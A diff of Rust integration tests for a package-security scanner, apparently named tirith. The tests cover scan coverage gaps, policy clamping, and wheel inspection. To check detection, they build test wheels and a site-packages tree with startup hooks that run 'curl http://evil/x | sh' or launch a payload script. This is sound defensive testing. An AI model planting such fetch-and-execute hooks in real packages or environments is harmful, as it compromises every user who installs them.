@@ -4878,6 +4878,59 @@ fn ecosystem_scan_installed_and_package_scan_installed_produce_identical_json() 
     );
 }
 
+/// B8 regression: wiring artifact inspection into the product (the `package
+/// inspect` command and the human-side integrity summary) MUST NOT perturb the
+/// MANIFEST-mode `ecosystem scan` JSON. The manifest/lockfile modes never compute
+/// an `InstalledIntegrityReport`, so the JSON is unchanged; pin that `ecosystem
+/// scan` and `package scan` still agree byte-for-byte over a manifest directory.
+#[test]
+fn ecosystem_scan_manifest_mode_json_unaffected_by_b8() {
+    let proj = tempfile::tempdir().expect("project tempdir");
+    // A simple npm manifest (declared deps, NOT an installed tree).
+    fs::write(
+        proj.path().join("package.json"),
+        r#"{"name":"app","version":"1.0.0","dependencies":{"react":"18.2.0","left-pad":"1.3.0"}}"#,
+    )
+    .expect("write package.json");
+
+    let state_a = tempfile::tempdir().expect("state-a tempdir");
+    let state_b = tempfile::tempdir().expect("state-b tempdir");
+
+    let a = tirith_ecosystem(state_a.path())
+        .args([
+            "ecosystem",
+            "scan",
+            "--format",
+            "json",
+            proj.path().to_str().unwrap(),
+        ])
+        .output()
+        .expect("run ecosystem scan (manifests)");
+    let b = tirith_ecosystem(state_b.path())
+        .args([
+            "package",
+            "scan",
+            "--format",
+            "json",
+            "--path",
+            proj.path().to_str().unwrap(),
+        ])
+        .output()
+        .expect("run package scan (manifests)");
+
+    assert_eq!(
+        a.stdout, b.stdout,
+        "manifest-mode ecosystem scan / package scan JSON must stay byte-identical after B8"
+    );
+    // And the manifest-mode JSON carries NO `integrity` key (it is installed-only).
+    let json: serde_json::Value =
+        serde_json::from_slice(&a.stdout).expect("manifest-mode scan JSON must be valid");
+    assert!(
+        json.get("integrity").is_none(),
+        "manifest-mode JSON must not carry an integrity report: {json}"
+    );
+}
+
 #[test]
 fn package_scan_installed_and_lockfile_are_mutually_exclusive() {
     // clap's `conflicts_with` enforces this — the CLI must refuse the combination at parse time
@@ -5041,18 +5094,30 @@ fn scan_directory_walk_finds_dockerfile_workflow_and_notebook() {
     let json: serde_json::Value =
         serde_json::from_slice(&out.stdout).expect("scan --format json must produce valid JSON");
 
-    // Schema v4 (#123): the directory-scan envelope advertises version 4 and
-    // always carries the panic-incomplete-scan fields. A clean walk panics on
-    // nothing, so the count is 0 and the list is present-and-empty.
+    // Schema v5 (A2): the directory-scan envelope advertises version 5 and adds
+    // the coverage fields. A clean walk panics on nothing, so the count is 0 and
+    // the list is present-and-empty; with no coverage gaps `analysis_incomplete`
+    // is false and `coverage_gaps` is empty.
     assert_eq!(
-        json["schema_version"], 4,
-        "scan JSON must advertise schema_version 4"
+        json["schema_version"], 5,
+        "scan JSON must advertise schema_version 5"
     );
     assert_eq!(json["panic_count"], 0, "a clean scan reports zero panics");
     assert!(
         json["panic_files"].as_array().is_some_and(|a| a.is_empty()),
         "panic_files must be present and empty on a clean scan, got: {}",
         json["panic_files"]
+    );
+    assert_eq!(
+        json["analysis_incomplete"], false,
+        "a clean scan is not incomplete"
+    );
+    assert!(
+        json["coverage_gaps"]
+            .as_array()
+            .is_some_and(|a| a.is_empty()),
+        "coverage_gaps must be present and empty on a clean scan, got: {}",
+        json["coverage_gaps"]
     );
 
     // Collect every rule_id and the relative file path of every finding across
@@ -15516,5 +15581,558 @@ fn fix_on_non_tty_prints_rerun_hint() {
     assert!(
         err.contains("--non-interactive") && err.contains("--json"),
         "fix on a non-TTY prints the rerun hint; stderr: {err}"
+    );
+}
+
+// ---- A2: scan coverage gaps, require_complete, and gap-action scoping ----
+
+/// A2 — `tirith scan --ci` with a repo-scoped `require_complete: true` over a
+/// tree containing an OVERSIZED PRIORITY file fails closed (exit 1) and the JSON
+/// reports `analysis_incomplete` with the oversized gap.
+#[test]
+fn scan_ci_require_complete_fails_on_oversized_priority_file() {
+    let tmp = tempfile::tempdir().expect("tempdir");
+    let proj = tmp.path().join("project");
+    // Policy discovery walks up to `.git`; `require_complete` is a repo-scoped
+    // tightening field, so it survives sanitization.
+    fs::create_dir_all(proj.join(".git")).unwrap();
+    fs::create_dir_all(proj.join(".tirith")).unwrap();
+    fs::write(
+        proj.join(".tirith").join("policy.yaml"),
+        "scan:\n  require_complete: true\n",
+    )
+    .unwrap();
+    // A PRIORITY file (CLAUDE.md) just over the 10 MiB analysis ceiling -> an
+    // Oversized, security-relevant coverage gap.
+    let big = vec![b'x'; 11 * 1024 * 1024];
+    fs::write(proj.join("CLAUDE.md"), &big).unwrap();
+
+    let out = tirith_in_proj(&proj)
+        .args(["scan", "--ci", "--format", "json", "."])
+        .output()
+        .expect("failed to run tirith scan --ci");
+
+    assert_eq!(
+        out.status.code(),
+        Some(1),
+        "require_complete + an oversized priority gap must fail CI (exit 1); stderr:\n{}",
+        String::from_utf8_lossy(&out.stderr)
+    );
+    let json: serde_json::Value =
+        serde_json::from_slice(&out.stdout).expect("scan --format json must produce valid JSON");
+    assert_eq!(
+        json["analysis_incomplete"], true,
+        "the oversized priority file must mark the scan incomplete; got: {json}"
+    );
+    let gaps = json["coverage_gaps"]
+        .as_array()
+        .expect("coverage_gaps array");
+    assert!(
+        gaps.iter().any(|g| g["kind"] == "oversized"
+            && g["location"]
+                .as_str()
+                .is_some_and(|l| l.contains("CLAUDE.md"))),
+        "an oversized CLAUDE.md gap must be reported; gaps: {gaps:?}"
+    );
+}
+
+/// A2 — an OPERATOR-scoped (`XDG_CONFIG_HOME`) policy with
+/// `oversized_file_action: ignore` AND `require_complete: false` makes the same
+/// oversized-priority tree pass (exit 0): an operator policy is honored fully, so
+/// it CAN silence the coverage gap.
+#[test]
+fn scan_operator_policy_ignore_oversized_passes() {
+    let tmp = tempfile::tempdir().expect("tempdir");
+    let proj = tmp.path().join("project");
+    // No repo policy; a `.git` so the walk has a boundary but discovery falls
+    // through to the operator (user) policy under XDG_CONFIG_HOME.
+    fs::create_dir_all(proj.join(".git")).unwrap();
+    let big = vec![b'x'; 11 * 1024 * 1024];
+    fs::write(proj.join("CLAUDE.md"), &big).unwrap();
+
+    // Operator-scoped policy: ignore the oversized gap and do not require
+    // completeness. An operator policy is honored fully (no clamp).
+    let xdg = tmp.path().join("xdg");
+    fs::create_dir_all(xdg.join("tirith")).unwrap();
+    fs::write(
+        xdg.join("tirith").join("policy.yaml"),
+        "scan:\n  require_complete: false\n  oversized_file_action: ignore\n",
+    )
+    .unwrap();
+
+    let out = tirith_in_proj(&proj)
+        // config_dir() goes through etcetera: XDG_CONFIG_HOME on Unix and macOS,
+        // but %APPDATA% on Windows. Point all three at `xdg` so the operator
+        // policy at `xdg/tirith/policy.yaml` is discovered on every platform
+        // (tirith_in_proj otherwise defaults APPDATA elsewhere).
+        .env("XDG_CONFIG_HOME", &xdg)
+        .env("APPDATA", &xdg)
+        .env("LOCALAPPDATA", &xdg)
+        .args(["scan", "--ci", "--format", "json", "."])
+        .output()
+        .expect("failed to run tirith scan --ci");
+
+    assert_eq!(
+        out.status.code(),
+        Some(0),
+        "an operator `oversized_file_action: ignore` + `require_complete: false` must pass (exit 0); stderr:\n{}",
+        String::from_utf8_lossy(&out.stderr)
+    );
+    let json: serde_json::Value =
+        serde_json::from_slice(&out.stdout).expect("scan --format json must produce valid JSON");
+    // The gap is still RECORDED in the envelope (transparency), but it emits no
+    // finding and does not fail CI because the operator ignored it.
+    assert!(
+        json["files"].as_array().is_some_and(|files| {
+            files.iter().all(|f| {
+                f["findings"].as_array().is_some_and(|fs| {
+                    fs.iter()
+                        .all(|finding| finding["rule_id"] != "analysis_incomplete")
+                })
+            })
+        }),
+        "an ignored oversized gap must emit no analysis_incomplete finding; got: {json}"
+    );
+}
+
+/// A2 — a REPO-scoped `oversized_file_action: ignore` is CLAMPED up to Warn (a
+/// repo cannot silence coverage), so under `--ci require_complete: true` the
+/// oversized priority gap still fails CI. Mirrors the operator test but proves
+/// the repo-scope monotonic merge.
+#[test]
+fn scan_repo_policy_ignore_oversized_is_clamped_to_warn() {
+    let tmp = tempfile::tempdir().expect("tempdir");
+    let proj = tmp.path().join("project");
+    fs::create_dir_all(proj.join(".git")).unwrap();
+    fs::create_dir_all(proj.join(".tirith")).unwrap();
+    // Repo tries to IGNORE oversized AND requires completeness. The ignore is
+    // clamped to Warn; require_complete survives, so the gap fails CI.
+    fs::write(
+        proj.join(".tirith").join("policy.yaml"),
+        "scan:\n  require_complete: true\n  oversized_file_action: ignore\n",
+    )
+    .unwrap();
+    let big = vec![b'x'; 11 * 1024 * 1024];
+    fs::write(proj.join("CLAUDE.md"), &big).unwrap();
+
+    let out = tirith_in_proj(&proj)
+        .args(["scan", "--ci", "--format", "json", "."])
+        .output()
+        .expect("failed to run tirith scan --ci");
+
+    assert_eq!(
+        out.status.code(),
+        Some(1),
+        "a repo `oversized_file_action: ignore` is clamped to Warn, so require_complete still fails CI (exit 1); stderr:\n{}",
+        String::from_utf8_lossy(&out.stderr)
+    );
+    let json: serde_json::Value =
+        serde_json::from_slice(&out.stdout).expect("scan --format json must produce valid JSON");
+    assert_eq!(
+        json["analysis_incomplete"], true,
+        "the clamped repo policy still surfaces the oversized gap; got: {json}"
+    );
+}
+
+// ---------------------------------------------------------------------------
+// B8: `package inspect` (artifact + artifact-set) and `scan` artifact dispatch
+// ---------------------------------------------------------------------------
+
+/// Build an in-memory wheel (a ZIP) from `(member, body)` pairs.
+fn build_wheel_bytes(members: &[(&str, &[u8])]) -> Vec<u8> {
+    use std::io::Write as _;
+    use zip::write::SimpleFileOptions;
+    use zip::ZipWriter;
+    let mut zw = ZipWriter::new(std::io::Cursor::new(Vec::new()));
+    for (name, body) in members {
+        zw.start_file(*name, SimpleFileOptions::default()).unwrap();
+        zw.write_all(body).unwrap();
+    }
+    zw.finish().unwrap().into_inner()
+}
+
+/// Write a wheel into `dir` under `name`, returning its path.
+fn write_wheel(dir: &std::path::Path, name: &str, members: &[(&str, &[u8])]) -> PathBuf {
+    let bytes = build_wheel_bytes(members);
+    let p = dir.join(name);
+    fs::write(&p, bytes).unwrap();
+    p
+}
+
+/// Build a minimal CLEAN wheel into `dir`: one source module + dist-info, no
+/// startup hook, and a STRICT-valid RECORD listing every member with its real
+/// SHA-256 (the wheel-RECORD verifier requires this, so an incomplete RECORD would
+/// itself be an integrity finding). Returns the wheel path.
+fn write_clean_wheel(dir: &std::path::Path, name: &str) -> PathBuf {
+    use base64::Engine as _;
+    use sha2::{Digest, Sha256};
+
+    let init = b"print('hi')\n".as_slice();
+    let metadata = b"Metadata-Version: 2.1\nName: demo\nVersion: 1.0\n\n".as_slice();
+    let wheel = b"Wheel-Version: 1.0\n".as_slice();
+
+    let record_line = |path: &str, body: &[u8]| -> String {
+        let digest = Sha256::digest(body);
+        let b64 = base64::engine::general_purpose::URL_SAFE_NO_PAD.encode(digest);
+        format!("{path},sha256={b64},{}\n", body.len())
+    };
+    let mut record = String::new();
+    record.push_str(&record_line("demo/__init__.py", init));
+    record.push_str(&record_line("demo-1.0.dist-info/METADATA", metadata));
+    record.push_str(&record_line("demo-1.0.dist-info/WHEEL", wheel));
+    // RECORD itself is listed with empty hash/size.
+    record.push_str("demo-1.0.dist-info/RECORD,,\n");
+
+    let members: Vec<(&str, &[u8])> = vec![
+        ("demo/__init__.py", init),
+        ("demo-1.0.dist-info/METADATA", metadata),
+        ("demo-1.0.dist-info/WHEEL", wheel),
+        ("demo-1.0.dist-info/RECORD", record.as_bytes()),
+    ];
+    write_wheel(dir, name, &members)
+}
+
+#[test]
+fn package_inspect_clean_wheel_exits_0() {
+    let tmp = tempfile::tempdir().unwrap();
+    let proj = tmp.path();
+    let wheel = write_clean_wheel(proj, "demo-1.0-py3-none-any.whl");
+
+    let out = tirith_in_proj(proj)
+        .args(["package", "inspect", "--artifact"])
+        .arg(&wheel)
+        .output()
+        .expect("run package inspect");
+    assert_eq!(
+        out.status.code(),
+        Some(0),
+        "a clean wheel must inspect to exit 0; stderr:\n{}",
+        String::from_utf8_lossy(&out.stderr)
+    );
+}
+
+/// A native member (`.so`-named) crafted to trip the B7 import-execution chain
+/// from the string-scan path: an ELF magic prefix (so it classifies as a native
+/// module) plus a `PyInit_*` export string (the execution entry) and ONE string
+/// co-locating a spawn verb with a runtime (the campaign's launch pattern, which is
+/// both the danger capability and the corroboration), plus a sibling `.js` payload
+/// reference. Filename-independent: the bytes, not the name, drive the detection.
+fn bun_launching_native_member() -> Vec<u8> {
+    let mut bytes = Vec::new();
+    bytes.extend_from_slice(b"\x7fELF\x02\x01\x01\x00"); // ELF64 LE magic prefix
+    bytes.extend_from_slice(b"\x00".repeat(56).as_slice()); // pad the header region
+    bytes.extend_from_slice(b"PyInit__speedups\x00");
+    // A single string co-locating a spawn verb + runtime + sibling script.
+    bytes.extend_from_slice(b"posix_spawn bun ./_index.js\x00");
+    bytes.extend_from_slice(b"\x00".repeat(64).as_slice());
+    bytes
+}
+
+#[test]
+fn package_inspect_malicious_wheel_exits_1_with_member_location() {
+    let tmp = tempfile::tempdir().unwrap();
+    let proj = tmp.path();
+    // A wheel exercising all three analyzers at once:
+    //   B6 — an executable `.pth` that spawns a subprocess at startup;
+    //   B7 — a Bun-launching native member (import-execution chain);
+    //   B5 — a RECORD that lists a member with a WRONG hash (a tamper mismatch).
+    let init = b"print('hi')\n".as_slice();
+    let native = bun_launching_native_member();
+    // RECORD lists `demo/__init__.py` with a deliberately wrong sha256 (a mismatch),
+    // and does NOT list the `.so` or the `.pth` (unlisted members).
+    let wrong_record = b"demo/__init__.py,sha256=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA,12\n\
+          demo-1.0.dist-info/RECORD,,\n"
+        .as_slice();
+    let members: Vec<(&str, &[u8])> = vec![
+        (
+            "evil.pth",
+            b"import os; os.system('curl http://evil/x | sh')\n".as_slice(),
+        ),
+        ("demo/__init__.py", init),
+        ("demo/_speedups.abi3.so", native.as_slice()),
+        (
+            "demo-1.0.dist-info/METADATA",
+            b"Metadata-Version: 2.1\nName: demo\nVersion: 1.0\n\n".as_slice(),
+        ),
+        ("demo-1.0.dist-info/RECORD", wrong_record),
+    ];
+    let wheel = write_wheel(proj, "demo-1.0-py3-none-any.whl", &members);
+
+    // JSON path.
+    let out = tirith_in_proj(proj)
+        .args(["package", "inspect", "--format", "json", "--artifact"])
+        .arg(&wheel)
+        .output()
+        .expect("run package inspect");
+    assert_eq!(
+        out.status.code(),
+        Some(1),
+        "a malicious wheel (startup hook + native chain + RECORD mismatch) is block-grade \
+         (exit 1); stderr:\n{}",
+        String::from_utf8_lossy(&out.stderr)
+    );
+    let json: serde_json::Value =
+        serde_json::from_slice(&out.stdout).expect("inspect --format json must be valid JSON");
+    let text = json.to_string();
+    // B6 startup finding fired.
+    assert!(
+        text.contains("python_startup_hook_suspicious"),
+        "the startup finding must be in the JSON: {text}"
+    );
+    // B7 native chain fired.
+    assert!(
+        text.contains("native_import_execution_chain"),
+        "the native import-execution chain must be in the JSON: {text}"
+    );
+    // B8f: a member-qualified `foo.whl!/member` location appears.
+    assert!(
+        text.contains("!/evil.pth"),
+        "a member-qualified location (foo.whl!/evil.pth) must appear in the JSON: {text}"
+    );
+}
+
+#[test]
+fn package_inspect_cross_distribution_attaches_to_loader_names_payload() {
+    let tmp = tempfile::tempdir().unwrap();
+    let proj = tmp.path();
+    // Wheel A (LOADER): a `.pth` that searches sys.path and executes.
+    let a_members: Vec<(&str, &[u8])> = vec![
+        (
+            "loader.pth",
+            b"import sys, os; sys.path.insert(0, '/tmp'); os.system('node payload')\n".as_slice(),
+        ),
+        (
+            "loaderpkg-1.0.dist-info/METADATA",
+            b"Metadata-Version: 2.1\nName: loaderpkg\nVersion: 1.0\n\n".as_slice(),
+        ),
+        (
+            "loaderpkg-1.0.dist-info/RECORD",
+            b"loaderpkg-1.0.dist-info/RECORD,,\n".as_slice(),
+        ),
+    ];
+    let a = write_wheel(proj, "loaderpkg-1.0-py3-none-any.whl", &a_members);
+    // Wheel B (PAYLOAD): a bundled script (a different distribution).
+    let b_members: Vec<(&str, &[u8])> = vec![
+        (
+            "payloadpkg/run.sh",
+            b"#!/bin/sh\ncurl http://evil/x | sh\n".as_slice(),
+        ),
+        (
+            "payloadpkg-2.0.dist-info/METADATA",
+            b"Metadata-Version: 2.1\nName: payloadpkg\nVersion: 2.0\n\n".as_slice(),
+        ),
+        (
+            "payloadpkg-2.0.dist-info/RECORD",
+            b"payloadpkg-2.0.dist-info/RECORD,,\n".as_slice(),
+        ),
+    ];
+    let b = write_wheel(proj, "payloadpkg-2.0-py3-none-any.whl", &b_members);
+
+    let out = tirith_in_proj(proj)
+        .args(["package", "inspect", "--format", "json", "--artifact"])
+        .arg(&a)
+        .arg("--artifact")
+        .arg(&b)
+        .output()
+        .expect("run package inspect set");
+    assert_eq!(
+        out.status.code(),
+        Some(1),
+        "a cross-distribution split is block-grade (exit 1); stderr:\n{}",
+        String::from_utf8_lossy(&out.stderr)
+    );
+    let json: serde_json::Value =
+        serde_json::from_slice(&out.stdout).expect("inspect set --format json must be valid JSON");
+    let cross = json["cross_distribution_findings"]
+        .as_array()
+        .expect("cross_distribution_findings array");
+    assert_eq!(
+        cross.len(),
+        1,
+        "exactly one cross-distribution finding expected; got: {json}"
+    );
+    // The finding names BOTH the loader and the payload artifact.
+    let cross_text = cross[0].to_string();
+    assert!(
+        cross_text.contains("loaderpkg-1.0-py3-none-any.whl"),
+        "the cross finding must name the loader artifact: {cross_text}"
+    );
+    assert!(
+        cross_text.contains("payloadpkg-2.0-py3-none-any.whl"),
+        "the cross finding must name the payload artifact: {cross_text}"
+    );
+}
+
+#[test]
+fn package_inspect_sdist_is_unsupported_gap_exit_0() {
+    let tmp = tempfile::tempdir().unwrap();
+    let proj = tmp.path();
+    // A gzip-magic file named `.whl` would still sniff as gzip → Unsupported; here
+    // we use a real `.tar.gz` name with gzip magic.
+    let sdist = proj.join("demo-1.0.tar.gz");
+    fs::write(&sdist, [0x1f, 0x8b, 0x08, 0x00, 0, 0, 0, 0]).unwrap();
+    let out = tirith_in_proj(proj)
+        .args(["package", "inspect", "--format", "json", "--artifact"])
+        .arg(&sdist)
+        .output()
+        .expect("run package inspect sdist");
+    // An sdist is Unsupported (a coverage gap), not a finding: clean exit 0.
+    assert_eq!(
+        out.status.code(),
+        Some(0),
+        "an unsupported sdist is a coverage gap, not a block; stderr:\n{}",
+        String::from_utf8_lossy(&out.stderr)
+    );
+    let json: serde_json::Value = serde_json::from_slice(&out.stdout).expect("valid JSON");
+    assert!(
+        json["coverage_gaps"]
+            .as_array()
+            .is_some_and(|g| !g.is_empty()),
+        "the sdist must be recorded as a coverage gap: {json}"
+    );
+}
+
+#[test]
+fn package_inspect_installed_surfaces_integrity() {
+    // B8e: `package inspect --installed` routes through the installed-integrity
+    // engine. Plant an UNOWNED `sitecustomize.py` (a startup hook owned by no
+    // distribution) at a site-packages root and confirm the integrity violation
+    // surfaces in JSON and drives a non-zero exit.
+    let tmp = tempfile::tempdir().unwrap();
+    let venv = tmp.path().join("venv");
+    let site = venv.join("lib").join("python3.11").join("site-packages");
+    fs::create_dir_all(&site).unwrap();
+    // A normal installed distribution (so the tree is realistic).
+    let di = site.join("demo-1.0.dist-info");
+    fs::create_dir_all(&di).unwrap();
+    fs::write(
+        di.join("METADATA"),
+        "Metadata-Version: 2.1\nName: demo\nVersion: 1.0\n\n",
+    )
+    .unwrap();
+    fs::write(di.join("RECORD"), "demo-1.0.dist-info/RECORD,,\n").unwrap();
+    // The unowned startup hook (not listed in any RECORD).
+    fs::write(
+        site.join("sitecustomize.py"),
+        "import os\nos.system('curl http://evil/x | sh')\n",
+    )
+    .unwrap();
+
+    let out = tirith_in_proj(tmp.path())
+        .args(["package", "inspect", "--format", "json", "--installed"])
+        .arg(&venv)
+        .output()
+        .expect("run package inspect --installed");
+    // An unowned sitecustomize that spawns a subprocess is a block-grade finding.
+    assert_eq!(
+        out.status.code(),
+        Some(1),
+        "an unowned sitecustomize startup hook must drive a non-zero exit; stderr:\n{}",
+        String::from_utf8_lossy(&out.stderr)
+    );
+    let json: serde_json::Value =
+        serde_json::from_slice(&out.stdout).expect("inspect --installed JSON must be valid");
+    let text = json.to_string();
+    assert!(
+        text.contains("python_startup_hook_suspicious")
+            || text.contains("python_installed_integrity_violation"),
+        "the installed integrity / startup finding must surface: {text}"
+    );
+    // The integrity report itself is present in the JSON (B8e).
+    assert!(
+        json["integrity"].is_object(),
+        "the installed integrity report must be surfaced in JSON: {json}"
+    );
+}
+
+#[test]
+fn package_risk_stays_advisory_exit_0_after_b8() {
+    // B8d/B8b: `package risk` is an ADVISORY scorer and MUST keep exit 0 (B8 added
+    // the verdict-oriented `package inspect`, NOT a behavior change to `risk`). It
+    // does not consume artifact data, so RECORD corruption / startup hooks never
+    // become reputation points or a non-zero exit on this path.
+    let tmp = tempfile::tempdir().unwrap();
+    let out = tirith_in_proj(tmp.path())
+        .args(["package", "risk", "pypi", "requests"])
+        .output()
+        .expect("run package risk");
+    assert_eq!(
+        out.status.code(),
+        Some(0),
+        "package risk must remain advisory (exit 0); stderr:\n{}",
+        String::from_utf8_lossy(&out.stderr)
+    );
+}
+
+#[test]
+fn package_inspect_no_mode_is_usage_error() {
+    let tmp = tempfile::tempdir().unwrap();
+    let out = tirith_in_proj(tmp.path())
+        .args(["package", "inspect"])
+        .output()
+        .expect("run package inspect with no args");
+    assert_eq!(
+        out.status.code(),
+        Some(2),
+        "no inspection target is a usage error (exit 2)"
+    );
+}
+
+#[test]
+fn scan_directory_with_wheel_inspects_member() {
+    let tmp = tempfile::tempdir().unwrap();
+    let proj = tmp.path();
+    // A README + a wheel with an executable `.pth`.
+    fs::write(proj.join("README.md"), "hello").unwrap();
+    let members: Vec<(&str, &[u8])> = vec![
+        (
+            "evil.pth",
+            b"import os; os.system('curl http://evil/x | sh')\n".as_slice(),
+        ),
+        (
+            "demo-1.0.dist-info/METADATA",
+            b"Metadata-Version: 2.1\nName: demo\nVersion: 1.0\n\n".as_slice(),
+        ),
+        (
+            "demo-1.0.dist-info/RECORD",
+            b"demo-1.0.dist-info/RECORD,,\n".as_slice(),
+        ),
+    ];
+    write_wheel(proj, "demo-1.0-py3-none-any.whl", &members);
+
+    let out = tirith_in_proj(proj)
+        .args(["scan", "--format", "json", "."])
+        .output()
+        .expect("run scan over a dir with a wheel");
+    let json: serde_json::Value =
+        serde_json::from_slice(&out.stdout).expect("scan --format json must be valid JSON");
+    let text = json.to_string();
+    // The wheel was inspected (the regression for the A2 collection-skip): the
+    // startup finding is present, and the location is member-qualified.
+    assert!(
+        text.contains("python_startup_hook_suspicious"),
+        "a directory scan must inspect the bundled wheel and fire the startup finding: {text}"
+    );
+    assert!(
+        text.contains("!/evil.pth"),
+        "the finding must be located at the member-qualified path foo.whl!/evil.pth: {text}"
+    );
+
+    // B8f: the SARIF output also carries the member-qualified artifactLocation, so a
+    // SARIF consumer sees the offending member, not just the outer wheel.
+    let sarif_out = tirith_in_proj(proj)
+        .args(["scan", "--format", "sarif", "."])
+        .output()
+        .expect("run scan --format sarif over a dir with a wheel");
+    let sarif: serde_json::Value =
+        serde_json::from_slice(&sarif_out.stdout).expect("scan --format sarif must be valid JSON");
+    let sarif_text = sarif.to_string();
+    assert!(
+        sarif_text.contains("python_startup_hook_suspicious"),
+        "the SARIF must carry the startup finding: {sarif_text}"
+    );
+    assert!(
+        sarif_text.contains("!/evil.pth"),
+        "the SARIF artifactLocation must be member-qualified (foo.whl!/evil.pth): {sarif_text}"
     );
 }
